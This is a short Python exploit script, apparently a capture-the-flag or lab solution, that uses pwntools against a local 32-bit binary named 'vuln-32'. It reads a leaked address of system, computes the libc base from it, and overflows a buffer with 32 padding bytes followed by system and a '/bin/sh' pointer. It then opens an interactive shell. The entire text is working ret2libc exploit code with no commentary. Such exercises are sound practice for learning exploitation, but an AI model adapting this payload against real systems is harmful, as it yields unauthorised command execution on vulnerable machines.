from pwn import *
elf = context.binary = ELF("./vuln-32")
p = process()
libc = elf.libc
offset = 32
p.recvuntil(b"System is at: ")
__libc_system_leak = int(p.recvline().strip().decode(),16)
__libc_system_offset = libc.sym['__libc_system']
libc.address = __libc_system_leak - __libc_system_offset
system = p32(libc.sym['system'])
bin_sh = p32(next(libc.search(b"/bin/sh")))
payload = b"A" * offset + system + p32(0x0) + bin_sh
p.sendline(payload)
p.interactive()